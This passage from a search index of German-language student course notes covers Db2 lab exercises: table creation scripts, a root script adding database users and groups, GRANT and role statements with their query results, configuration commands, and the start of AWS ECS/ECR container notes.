OFF;\n--------------------------------------------------------------------------\n-- Set Schema UEB03D, Set \n--   - setzt Default-Schema, falls in Objekt-Referent nicht angegeben\n--------------------------------------------------------------------------\nSET SCHEMA UEB03D;\n--------------------------------------------------------------------------\n-- Stop execution on command error OFF\n--------------------------------------------------------------------------\nUPDATE COMMAND OPTIONS USING S OFF;\n-- Ganz Oben Hinzugef\u00fcgt\nCREATE TABLESPACE STBDPOSTFILESTREET\nPAGESIZE 4096\nMANAGED BY AUTOMATIC STORAGE\n;\n--------------------------------------------------------------------------\n-- DROP objects in schema UEB03D\n--------------------------------------------------------------------------\nDROP TABLE \"ARTIKEL\" ;\nDROP TABLE \"ART_SW\" ;\nDROP TABLE \"ART_AUT\" ;\nDROP TABLE \"AUTOR\" ;\nDROP TABLE \"BUCH_AUT\" ;\nDROP TABLE \"BUCH_SW\" ;\nDROP TABLE \"BUCHTITEL\" ;\nDROP TABLE \"DISS_AUT\" ;\nDROP TABLE \"DISS_SW\" ;\nDROP TABLE \"DISSERTATION\" ;\nDROP TABLE \"INSTITUTION\" ;\nDROP TABLE \"REPORT\" ;\nDROP TABLE \"REPORT_AUT\" ;\nDROP TABLE \"REPORT_SW\" ;\nDROP TABLE \"SCHLAGWORT\" ;\nDROP TABLE \"VERLAG\" ;\n--------------------------------------------------------------------------\n-- Stop execution on command error ON\n--------------------------------------------------------------------------\nUPDATE COMMAND OPTIONS USING S ON;\n--------------------------------------------------------------------------\n-- CREATE tables in schema UEB03D\n--------------------------------------------------------------------------\nCREATE TABLE  \"ARTIKEL\"  (\n\"ARTIKELID\"        INTEGER NOT NULL ,\n\"TITEL\"            VARCHAR(255) ,\n\"JAHR\"             SMALLINT ,\n\"AUSTITEL\"         VARCHAR(255) ,\n\"SEITE_VON\"        SMALLINT ,\n\"SEITE_BIS\"        SMALLINT ,\n\"BUCHID\"           INTEGER ,\n\"URL\"              VARCHAR(200) ,\n\"CR\"               VARCHAR(80) ,\n\"BEMERKUNG\"        VARCHAR(100) )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"ART_SW\"  (\n\"ARTIKELID\"         INTEGER NOT NULL ,\n\"SWID\"              INTEGER NOT NULL )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"ART_AUT\"  (\n\"ARTIKELID\"         INTEGER NOT NULL ,\n\"AUTORID\"           INTEGER NOT NULL ,\n\"ROLLE\"             VARCHAR(1) ,\n\"RANG\"              SMALLINT )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"AUTOR\"  (\n\"AUTORID\"           INTEGER NOT NULL ,\n\"NAME\"              VARCHAR(30) ,\n\"ZUSATZ\"            VARCHAR(10) ,\n\"INITIALEN\"         VARCHAR(6) ,\n\"VORNAMEN\"          VARCHAR(30) ,\n\"INSTITUTION\"       VARCHAR(50) ,\n\"URL\"               VARCHAR(200) ,\n\"BEMERKUNG\"         VARCHAR(10000) ,\n\"PSEUDONYM\"         INTEGER )\nIN \"STBDPOSTFILESTREET\" ; CREATE TABLE  \"BUCH_AUT\"  ( \"BUCHID\"            INTEGER NOT NULL ,\n\"AUTORID\"           INTEGER NOT NULL ,\n\"ROLLE\"             VARCHAR(1) ,\n\"RANG\"              SMALLINT )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"BUCH_SW\"  (\n\"BUCHID\"           INTEGER NOT NULL ,\n\"SWID\"             INTEGER NOT NULL )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"BUCHTITEL\"  (\n\"BUCHID\"           INTEGER NOT NULL ,\n\"GESAMTID\"         INTEGER ,\n\"BANDNR\"           SMALLINT ,\n\"HSTITEL\"          VARCHAR(255) ,\n\"ESTITEL\"          VARCHAR(100) ,\n\"ISBN\"             VARCHAR(15) ,\n\"ISBN2\"            VARCHAR(15)  ,\n\"AUFLAGE\"          VARCHAR(70) ,\n\"JAHR\"             SMALLINT ,\n\"MEDIUM\"           VARCHAR(20) ,\n\"UMFANG\"           VARCHAR(50) ,\n\"PREIS\"            VARCHAR(20) ,\n\"BEZUGINFO\"        VARCHAR(30) ,\n\"VERF_IN_VORLFORM\" VARCHAR(130) ,\n\"REIHE1\"           VARCHAR(150) ,\n\"REIHE2\"           VARCHAR(150) ,\n\"KSCHAFT1\"         VARCHAR(100) ,\n\"KSCHAFT2\"         VARCHAR(100) ,\n\"HSV\"              VARCHAR(50) ,\n\"SIGNATUR\"         VARCHAR(30) ,\n\"ZUGANGSNR\"        VARCHAR(30) ,\n\"BESTAND\"          VARCHAR(50) ,\n\"WEITEXEMP\"        VARCHAR(30) ,\n\"ERFDATUM\"         VARCHAR(17) ,\n\"AENDATUM\"         VARCHAR(17) ,\n\"VERLAGSID\"        INTEGER ,\n\"URL\"              VARCHAR(200) ,\n\"CR\"               VARCHAR(80) ,\n\"BEMERKUNG\"        VARCHAR(100) ,\n\"BAENDE\"           SMALLINT )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"DISS_AUT\"  (\n\"DISSID\"           INTEGER NOT NULL ,\n\"AUTORID\"          INTEGER NOT NULL ,\n\"ROLLE\"            VARCHAR(1) ,\n\"RANG\"             SMALLINT )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"DISS_SW\"  (\n\"DISSID\"           INTEGER NOT NULL ,\n\"SWID\"             INTEGER NOT NULL )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"DISSERTATION\"  (\n\"DISSID\"            INTEGER NOT NULL ,\n\"TITEL\"             VARCHAR(255) ,\n\"INSTID\"            INTEGER ,\n\"ORT\"               VARCHAR(80) ,\n\"JAHR\"              SMALLINT ,\n\"ISBN\"              VARCHAR(15) ,\n\"TYP\"               VARCHAR(1) ,\n\"UMFANG\"            VARCHAR(50) ,\n\"SIGNATUR\"          VARCHAR(30) ,\n\"ZUGANGSNR\"         VARCHAR(50) ,\n\"BESTAND\"           VARCHAR(30) ,\n\"URL\"               VARCHAR(200) ,\n\"CR\"                VARCHAR(80) ,\n\"BEMERKUNG\"         VARCHAR(100) )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"INSTITUTION\"  (\n\"INSTID\"            INTEGER NOT NULL ,\n\"NAME\"              VARCHAR(80) ,\n\"ORT\"               VARCHAR(80) ,\n\"ADRESSE\"           VARCHAR(80) ,\n\"TEL\"               VARCHAR(20) ,\n\"URL\"               VARCHAR(200) ,\n\"BEMERKUNG\"         VARCHAR(100) ,\n\"FAX\"               VARCHAR(20) )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"REPORT\"  (\n\"REPORTID\"          INTEGER NOT NULL ,\n\"TITEL\"             VARCHAR(255) ,\n\"INSTID\"            INTEGER ,\n\"JAHR\"              SMALLINT ,\n\"LFDNR\"             SMALLINT ,\n\"URL\"               VARCHAR(200) ,\n\"CR\"                VARCHAR(80) ,\n\"UMFANG\"            VARCHAR(50) ,\n\"BEMERKUNG\"         VARCHAR(100) ,\n\"REIHE\"             VARCHAR(150) ,\n\"SIGNATUR\"          VARCHAR(30) )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"REPORT_AUT\"  (\n\"REPORTID\"         INTEGER NOT NULL ,\n\"AUTORID\"          INTEGER NOT NULL ,\n\"RANG\"             SMALLINT )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"SCHLAGWORT\"  (\n\"SWID\"              INTEGER NOT NULL ,\n\"SCHLAGWORT\"        VARCHAR(50) )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"REPORT_SW\"  (\n\"REPORTID\"          INTEGER NOT NULL ,\n\"SWID\"              INTEGER NOT NULL )\nIN \"STBDPOSTFILESTREET\" ;\nCREATE TABLE  \"VERLAG\"  (\n\"VERLAGSID\"         INTEGER NOT NULL ,\n\"NAME\"              VARCHAR(80) ,\n\"ORT\"               VARCHAR(80) ,\n\"ISBNKZ\"            VARCHAR(10) ,\n\"ADRESSE\"           VARCHAR (80) ,\n\"TEL\"               VARCHAR(20) ,\n\"URL\"               VARCHAR(200) ,\n\"BEMERKUNG\"         VARCHAR(100) ,\n\"FAX\"               VARCHAR(20) )\nIN \"STBDPOSTFILESTREET\" ;\n--------------------------------------------------------------------------\n-- Add constraint for primary keys\n--------------------------------------------------------------------------\nALTER TABLE  \"ARTIKEL\"      ADD CONSTRAINT \"PK_ARTIKEL\"      PRIMARY KEY (\"ARTIKELID\");\nALTER TABLE  \"ART_SW\"       ADD CONSTRAINT \"PK_ART_SW\"       PRIMARY KEY (\"ARTIKELID\", \"SWID\");\nALTER TABLE  \"ART_AUT\"      ADD CONSTRAINT \"PK_ART_AUT\"      PRIMARY KEY (\"ARTIKELID\", \"AUTORID\");\nALTER TABLE  \"AUTOR\"        ADD CONSTRAINT \"PK_AUTOR\"        PRIMARY KEY (\"AUTORID\");\nALTER TABLE  \"BUCH_AUT\"     ADD CONSTRAINT \"PK_BUCH_AUT\"     PRIMARY KEY (\"BUCHID\", \"AUTORID\");\nALTER TABLE  \"BUCH_SW\"      ADD CONSTRAINT \"PK_BUCH_SW\"      PRIMARY KEY (\"BUCHID\", \"SWID\");\nALTER TABLE  \"BUCHTITEL\"    ADD CONSTRAINT \"PK_BUCHTITEL\"    PRIMARY KEY (\"BUCHID\");\nALTER TABLE  \"DISS_AUT\"     ADD CONSTRAINT \"PK_DISS_AUT\"     PRIMARY KEY (\"DISSID\", \"AUTORID\");\nALTER TABLE  \"DISS_SW\"      ADD CONSTRAINT \"PK_DISS_SW\"      PRIMARY KEY (\"DISSID\", \"SWID\");\nALTER TABLE  \"DISSERTATION\" ADD CONSTRAINT \"PK_DISSERTATION\" PRIMARY KEY (\"DISSID\");\nALTER TABLE  \"INSTITUTION\"  ADD CONSTRAINT \"PK_INSTITUTION\"  PRIMARY KEY (\"INSTID\");\nALTER TABLE  \"REPORT\"       ADD CONSTRAINT \"PK_REPORT\"       PRIMARY KEY (\"REPORTID\");\nALTER TABLE  \"REPORT_AUT\"   ADD CONSTRAINT \"PK_REPORT_AUT\"   PRIMARY KEY (\"REPORTID\", \"AUTORID\");\nALTER TABLE  \"REPORT_SW\"    ADD CONSTRAINT \"PK_REPORT_SW\"    PRIMARY KEY (\"REPORTID\", \"SWID\");\nALTER TABLE  \"SCHLAGWORT\"   ADD CONSTRAINT \"PK_SCHLAGWORT\"   PRIMARY KEY (\"SWID\");\nALTER TABLE  \"VERLAG\"       ADD CONSTRAINT \"PK_VERLAG\"       PRIMARY KEY (\"VERLAGSID\");\n--------------------------------------------------------------------------\n-- Add additional indexes\n--------------------------------------------------------------------------\nCREATE INDEX  \"I_ARTIKEL_BUCHID\" ON  \"ARTIKEL\"  (\"BUCHID\" ASC) ALLOW REVERSE SCANS;\nCREATE INDEX  \"I_AUTOREN_NAME\" ON  \"AUTOR\"  (\"NAME\" ASC,  \"VORNAMEN\" ASC) ALLOW REVERSE SCANS;\n--------------------------------------------------------------------------\n-- Commit work\n--------------------------------------------------------------------------\nCOMMIT WORK;\nECHO ******************** END OF SCRIPT ********************; </code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-5/","title":"Db2 Hofstetter Aufgabe 5","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-5/#auftrag","title":"Auftrag","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-5/#ubung-1","title":"\u00dcbung 1","text":"Ueb1_CREATE_User.sh<pre><code>#!/usr/bin/ksh\n#\n# ACHTUNG: dies ist ein UNIX Script und KEIN SQL-Script !!!!!\n#\n# Sie koennen in diesem UNIX Script die notwendigen Statements fuer das Erstellen der\n# Gruppen und User erfassen, denken Sie jedoch daran, dass SIe dieses Script als root\n# User ausfuehren muessen.\n#\n# Hier die Commands fuer das Erstellen, Modifizieren und Loeschen von User und Groups:\n#\n# Groups:     groupadd    groupmod   groupdel\n# User:       useradd     usermod    userdel     chage    passwd  \n#\nif [[ $(whoami) != \"root\" ]]; then\necho \"sie muessen die Gruppen und User mit dem root User anlegen!!!\"\nexit 16\nfi\n# Erstellen der Groups\ngroupadd dbusrgrp   # Befehl zum Erstellen einer Gruppe mit dem Namen \"dbusrgrp\"\ngroupadd dbadmgrp   # Befehl zum Erstellen einer Gruppe mit dem Namen \"dbadmgrp\"\n# Erstellen der User\nuseradd dbuser10    # Befehl zum Erstellen eines Benutzers mit dem Namen \"dbuser10\"\npasswd dbuser10     # Befehl zum Festlegen des Passworts f\u00fcr den Benutzer \"dbuser10\"\nchage -I -1 -m 0 -M 99999 -E -1 dbuser10   # Befehl zur \u00c4nderung der Passwortrichtlinien f\u00fcr den Benutzer \"dbuser10\"\nuseradd dbuser11    # Befehl zum Erstellen eines Benutzers mit dem Namen \"dbuser11\"\npasswd dbuser11     # Befehl zum Festlegen des Passworts f\u00fcr den Benutzer \"dbuser11\"\nchage -I -1 -m 0 -M 99999 -E -1 dbuser11   # Befehl zur \u00c4nderung der Passwortrichtlinien f\u00fcr den Benutzer \"dbuser11\"\nuseradd dbuser12    # Befehl zum Erstellen eines Benutzers mit dem Namen \"dbuser12\"\npasswd dbuser12     # Befehl zum Festlegen des Passworts f\u00fcr den Benutzer \"dbuser12\"\nchage -I -1 -m 0 -M 99999 -E -1 dbuser12   # Befehl zur \u00c4nderung der Passwortrichtlinien f\u00fcr den Benutzer \"dbuser12\"\nusermod -a -G dbusrgrp dbuser11   # Befehl zum Hinzuf\u00fcgen des Benutzers \"dbuser11\" zur Gruppe \"dbusrgrp\"\nusermod -a -G dbadmgrp dbuser12   # Befehl zum Hinzuf\u00fcgen des Benutzers \"dbuser12\" zur Gruppe \"dbadmgrp\"\nexit   # Beenden des Skripts\n</code></pre> Ueb1_GRANT_User.sh<pre><code>--\n-- Speichern Sie in diesem SQL Script die notwendigen GRANT Statements\n--\nCONNECT TO DBBW001;\n-- Autorisierungen f\u00fcr die Gruppe dbusrgrp\nGRANT DATAACCESS ON DATABASE TO GROUP dbusrgrp;\n-- Autorisierungen f\u00fcr die Gruppe dbadmgrp\nGRANT DBADM WITHOUT DATAACCESS ON DATABASE TO GROUP dbadmgrp;\nCONNECT TO DBBW002;\n-- Autorisierungen f\u00fcr die Gruppe dbusrgrp\nGRANT DATAACCESS ON DATABASE TO GROUP dbusrgrp;\n-- Autorisierungen f\u00fcr die Gruppe dbadmgrp\nGRANT DBADM WITHOUT DATAACCESS ON DATABASE TO GROUP dbadmgrp;\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-5/#ubung-2","title":"\u00dcbung 2","text":"<p>Dokumentieren Sie das Resultat der einzelnen Abfragen (als Resultat ist entweder die Anzahl Datens\u00e4tze oder die SQL-Fehler-Meldung zu notieren):</p> <p>mit dbuser10 Resultat: <pre><code>SQL0551N  The statement failed because the authorization ID does not have the required authorization or privilege to perform the operation.  Authorization ID: \"DBUSER10\".  Operation: \"SELECT\". Object: \"BIBLIO.TARTIKEL\".  SQLSTATE=42501\n</code></pre></p> <p>mit dbuser11 Resultat: <pre><code>[db2inst1@localhost ueb05]$ db2 \"SELECT COUNT(*) FROM BIBLIO.TARTIKEL\"\n1          -----------\n         19\n1 record(s) selected.\n</code></pre></p> <p>mit dbuser12 Resultat: <pre><code>[db2inst1@localhost ueb05]$ db2 \"SELECT COUNT(*) FROM BIBLIO.TARTIKEL\"\nSQL0551N  The statement failed because the authorization ID does not have the required authorization or privilege to perform the operation.  Authorization ID: \"DBUSER12\".  Operation: \"SELECT\". Object: \"BIBLIO.TARTIKEL\".  SQLSTATE=42501\n</code></pre></p> <p>Erstellen Sie in der Datenbank DBBW002 mit dem Instanz-User die Tabelle BIBLIO.TARTIKEL. Das CREATE Statement finden Sie im \u00dcbungs-Verzeichnis (CREATE_TABLE_TARTIKEL.sql). F\u00fchren Sie nun das SELECT Statement nochmals f\u00fcr diese Tabelle in der Datenbank DBBW002 aus.</p> <p>mit dbuser10 Resultat: <pre><code>[db2inst1@localhost ueb05]$ db2 \"SELECT COUNT(*) FROM BIBLIO.TARTIKEL\"\n1          -----------\n          0\n1 record(s) selected.\n</code></pre></p> <p>mit dbuser11 Resultat: <pre><code>[db2inst1@localhost ueb05]$ db2 \"SELECT COUNT(*) FROM BIBLIO.TARTIKEL\"\n1          -----------\n          0\n1 record(s) selected.\n</code></pre></p> <p>mit dbuser12 Resultat: <pre><code>[db2inst1@localhost ueb05]$ db2 \"SELECT COUNT(*) FROM BIBLIO.TARTIKEL\"\n1          -----------\n          0\n1 record(s) selected.\n</code></pre></p>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-5/#ubung-3","title":"\u00dcbung 3","text":"Ueb3_CREATE_TABLES.sql<pre><code>--\n-- Create Statements fuer Uebung Database Security\n--\nCREATE TABLE TDBS_PERSON ( PERSONID    INTEGER GENERATED BY DEFAULT AS IDENTITY (START WITH 1, INCREMENT BY 1, CACHE 20) NOT NULL,\nNAME        VARCHAR(50) NOT NULL,\nVORNAME     VARCHAR(50) NOT NULL,\nKLASSE      VARCHAR(25) NOT NULL,\nLEHRBETRIEB VARCHAR(50) )\n;\nCREATE TABLE TDBS_ABTEILUNG ( ABTEILUNGID INTEGER GENERATED BY DEFAULT AS IDENTITY (START WITH 1, INCREMENT BY 1, CACHE 20) NOT NULL,\nNAMEID      VARCHAR(10) NOT NULL,\nBEZEICHNUNG VARCHAR(50) NOT NULL,\nMANAGERIDFS INTEGER\n)\n;\nCREATE UNIQUE INDEX IU03ABTEILUNG_PK\nON TDBS_ABTEILUNG (ABTEILUNGID)\nPCTFREE 10\nMINPCTUSED 10\nALLOW REVERSE SCANS ;   ALTER TABLE TDBS_ABTEILUNG\nADD CONSTRAINT PK_TDBS_ABTEILUNG\nPRIMARY KEY (ABTEILUNGID)\n;\nCREATE UNIQUE INDEX IU03PERSON_PK\nON TDBS_PERSON (PERSONID)\nPCTFREE 10\nMINPCTUSED 10\nALLOW REVERSE SCANS ;   ALTER TABLE TDBS_PERSON\nADD CONSTRAINT PK_TDBS_PERSON\nPRIMARY KEY (PERSONID)\n;\nSELECT * FROM TDBS_PERSON;\nSELECT * FROM TDBS_ABTEILUNG;\n</code></pre> Ueb3_GRANT_User.sql<pre><code>-- Autorisierungen f\u00fcr User dbuser10\nGRANT CREATETAB, IMPLICIT_SCHEMA ON DATABASE TO USER dbuser10;\nGRANT USE OF TABLESPACE USERSPACE1 TO USER dbuser10;\n-- Autorisierungen f\u00fcr User dbuser11\nGRANT CREATETAB, IMPLICIT_SCHEMA ON DATABASE TO USER dbuser11;\nGRANT USE OF TABLESPACE USERSPACE1 TO USER dbuser11;\n-- Autorisierungen f\u00fcr User dbuser12\nGRANT CREATETAB, IMPLICIT_SCHEMA ON DATABASE TO USER dbuser12;\nGRANT USE OF TABLESPACE USERSPACE1 TO USER dbuser12;\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2-Aufgabe-5/#ubung-4","title":"\u00dcbung 4","text":"Ueb4_GRANT_ROLE.sql<pre><code>--\n-- Speichern Sie in diesem SQL Script die notwendigen GRANT Statements\n--\nCONNECT TO DBBW002\n-- Erstellen der Rolle \"TESTER\"\nCREATE ROLE TESTER;\n-- Autorisierungen f\u00fcr die Rolle \"TESTER\"\nGRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER10.TDBS_PERSON TO ROLE TESTER;\nGRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER11.TDBS_PERSON TO ROLE TESTER;\nGRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER12.TDBS_PERSON TO ROLE TESTER;\nGRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER10.TDBS_ABTEILUNG TO ROLE TESTER;\nGRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER11.TDBS_ABTEILUNG TO ROLE TESTER;\nGRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER12.TDBS_ABTEILUNG TO ROLE TESTER;\n-- Setzen der Rolle \"TESTER\" f\u00fcr die Benutzer \"tester01\" und \"tester02\"\nGRANT ROLE TESTER TO USER tester01;\nGRANT ROLE TESTER TO USER tester02;\nGRANT CONNECT ON DATABASE TO ROLE TESTER;\ngrant usage on workload SYSDEFAULTUSERWORKLOAD to ROLE TESTER;\nGRANT EXECUTE ON PACKAGE NULLID.SQLC2P31 TO ROLE TESTER;\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2/","title":"db2 Befehle","text":""},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2/#script-ausfuhren","title":"SCRIPT AUSF\u00dcHREN","text":"<p>F\u00fcr das Ausf\u00fchren des SQL-Skripts \"UEB03-00.sql\" und das Anzeigen der Ergebnisse, nutzt du den \"db2 -tvf\"-Befehl. Hier ist der komplette Befehl:</p> <pre><code>db2 -tvf UEB03-00.sql\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2/#konfigurationparameter-auslesen","title":"KONFIGURATION/PARAMETER AUSLESEN","text":"<p>Um die Konfiguration der DB2-Datenbankmanager-Instanz auszulesen und die Ergebnisse nach dem Parameter \"numdb\" zu filtern, verwendest du den folgenden Befehl:</p> <pre><code>db2 get dbm cfg | grep -i numdb\n</code></pre> <p>Zum Verbinden mit der Datenbank \"DBBW001\" und Auslesen ihrer Konfigurationsparameter, nutze diesen Befehl:</p> <pre><code>db2 connect to DBBW001\ndb2 get db cfg | grep -i log\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2/#konfigurationparameter-anpassen","title":"KONFIGURATION/PARAMETER ANPASSEN","text":"<p>Zur Aktualisierung des Diagnoselevels der Datenbankmanager-Instanz auf \"1\" und zur Anpassung von Konfigurationsparametern, verwendest du diese Befehle:</p> <pre><code>db2 update dbm cfg using DIAGLEVEL 1\ndb2 update db cfg\ndb2 UPDATE DBM CFG USING NUMDB 32\ndb2 UPDATE DB CFG USING LOGSECOND 15\ndb2 UPDATE DB CFG FOR dbbw001 USING LOGSECOND 15\n</code></pre>"},{"location":"BBW/Hofstetter/M141%20-%20Datenbanksystem%20in%20Betrieb%20nehmen/db2/#berechtigungen-verwalten","title":"BERECHTIGUNGEN VERWALTEN","text":"<p>Um Berechtigungen zu vergeben, nutzt du die folgenden SQL-Statements. Sie spezifizieren die gew\u00fcnschten Autorisierungen f\u00fcr bestimmte Nutzergruppen und individuelle Nutzer.</p> <pre><code>db2 CONNECT TO DBBW001;\n-- Autorisierungen f\u00fcr die Gruppe dbusrgrp\ndb2 GRANT DATAACCESS ON DATABASE TO GROUP dbusrgrp;\n-- Autorisierungen f\u00fcr die Gruppe dbadmgrp\ndb2 GRANT DBADM WITHOUT DATAACCESS ON DATABASE TO GROUP dbadmgrp;\ndb2 CONNECT TO DBBW002;\n-- Autorisierungen f\u00fcr die Gruppe dbusrgrp\ndb2 GRANT DATAACCESS ON DATABASE TO GROUP dbusrgrp;\n-- Autorisierungen f\u00fcr die Gruppe dbadmgrp\ndb2 GRANT DBADM WITHOUT DATAACCESS ON DATABASE TO GROUP dbadmgrp;\n-- Autorisierungen f\u00fcr User dbuser10\ndb2 GRANT CREATETAB, IMPLICIT_SCHEMA ON DATABASE TO USER dbuser10;\ndb2 GRANT USE OF TABLESPACE USERSPACE1 TO USER dbuser10;\n-- Autorisierungen f\u00fcr User dbuser11\ndb2 GRANT CREATETAB, IMPLICIT_SCHEMA ON DATABASE TO USER dbuser11;\ndb2 GRANT USE OF TABLESPACE USERSPACE1 TO USER dbuser11;\n-- Autorisierungen f\u00fcr User dbuser12\ndb2 GRANT CREATETAB, IMPLICIT_SCHEMA ON DATABASE TO USER dbuser12;\ndb2 GRANT USE OF TABLESPACE USERSPACE1 TO USER dbuser12;\n</code></pre> <p>Zum Erstellen einer Rolle und zum Setzen von Berechtigungen f\u00fcr diese Rolle, nutze die folgenden Befehle:</p> <pre><code>db2 CONNECT TO DBBW002;\n-- Erstellen der Rolle \"TESTER\"\ndb2 CREATE ROLE TESTER;\n-- Autorisierungen f\u00fcr die Rolle \"TESTER\"\ndb2 GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER10.TDBS_PERSON TO ROLE TESTER;\ndb2 GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER11.TDBS_PERSON TO ROLE TESTER;\ndb2 GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER12.TDBS_PERSON TO ROLE TESTER;\ndb2 GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER10.TDBS_ABTEILUNG TO ROLE TESTER;\ndb2 GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER11.TDBS_ABTEILUNG TO ROLE TESTER;\ndb2 GRANT SELECT, INSERT, UPDATE, DELETE ON TABLE DBUSER12.TDBS_ABTEILUNG TO ROLE TESTER;\n-- Setzen der Rolle \"TESTER\" f\u00fcr die Benutzer \"tester01\" und \"tester02\"\ndb2 GRANT ROLE TESTER TO USER tester01;\ndb2 GRANT ROLE TESTER TO USER tester02;\ndb2 GRANT CONNECT ON DATABASE TO ROLE TESTER;\ndb2 GRANT USAGE ON WORKLOAD SYSDEFAULTUSERWORKLOAD TO ROLE TESTER;\ndb2 GRANT EXECUTE ON PACKAGE NULLID.SQLC2P31 TO ROLE TESTER;\n</code></pre>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/","title":"ArchRefCard-01 mit AWS Fargate (Kompetenznachweis)","text":""},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#auftrag","title":"Auftrag","text":""},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#grafik-und-diagramme","title":"Grafik und Diagramme","text":"<p>Aufgabe: Erstellen Sie Grafiken und Diagramme von ECS und ECR: Wie spielen Repository, Task Definition, Task und Service zusammen?</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#ecs-beschreiben","title":"ECS-Beschreiben","text":"<p>Aufgabe: Beschreiben Sie die Funktionalit\u00e4t von ECS:</p> <ul> <li>Skalierbarkeit: ECS bietet eine automatische Skalierung von Container-Workloads an, um den Anforderungen gerecht zu werden. Durch die Nutzung von Auto Scaling-Gruppen und Elastic Load Balancing kann die Skalierung der Container-Workloads dynamisch angepasst werden.</li> <li>Cluster-Management: ECS erm\u00f6glicht die Erstellung und Verwaltung von Clustern, bestehend aus EC2-Instanzen oder Fargate-Containern, auf denen Container-Workloads ausgef\u00fchrt werden k\u00f6nnen. Innerhalb dieser Cluster k\u00f6nnen Ressourcen gemeinsam genutzt werden, um verschiedene Anwendungen und Services zu unterst\u00fctzen.</li> <li>Integrationen: ECS ist eng mit anderen AWS-Diensten integriert, darunter Elastic Load Balancing, Identity and Access Management (IAM), CloudWatch und CloudFormation. Dadurch l\u00e4sst sich ECS nahtlos in bestehende AWS-Infrastrukturen und Workflows integrieren. Diese Integrationen erm\u00f6glichen eine verbesserte Skalierbarkeit, \u00dcberwachung, Zugriffskontrolle und die Automatisierung von Prozessen.</li> </ul>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#privates-repository-erstellen","title":"Privates Repository erstellen","text":"<p>Aufgabe: Erstellen Sie eine ein privates Repository in ECR f\u00fcr die App Ref. Card 01</p> <p>Um ein privates Repository in AWS ECR zu erstellen, geht man auf die AWS-Webseite und navigiert zum ECR (Elastic Container Registry). Dort klickt man auf die Schaltfl\u00e4che \"Repository erstellen\". Anschlie\u00dfend f\u00fcllt man das Formular wie folgt aus:</p> <p></p> <p>Nach dem Erstellen des Repositories sollte es etwa wie folgt aussehen:</p> <p></p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#optimiertes-dockerfile","title":"Optimiertes Dockerfile","text":"<p>Aufgabe: Benutzen Sie Ihr optimiertes Dockerfile aus dem Unterricht. Sollten Sie kein lauff\u00e4higes Dockerfile besitzen, verwenden Sie die Vorlage auf der n\u00e4chsten Seite.</p> <p>Im folgenden Link findet man meine Version des optimierten Dockerfiles mit allen dazugeh\u00f6rigen files: Dockerfile: https://github.com/masluse/m346-ref-card-01</p>"},{"location":"BBW/Ruettimann/169%20-%20Services%20mit%20Containern%20bereitstellen/ArchRefCard-01-mit-AWS-Fargate/#testen","title":"Testen","text":"<p>Zun\u00e4chst \u00fcberpr\u00fcfen wir das Image mit dem Befehl 'docker build' und starten dann einen Container daraus.</p> <pre><code>docker build -t archrefcard-01:latest .\n</code></pre> <p></p> <p>Um sicherzustellen, dass Ihr erstelltes Image einwandfrei funktioniert, k\u00f6nnen Sie es mithilfe der Befehle \"docker images\" oder \"docker inspect\" \u00fcberpr\u00fcfen. Sobald Sie die notwendigen Informationen \u00fcber Ihr Image erhalten haben, k\u00f6nnen Sie es lokal ausf\u00fchren, indem Sie den Befehl \"docker run\" verwenden. Vergewissern Sie sich, dass die Ausf\u00fchrung des Images 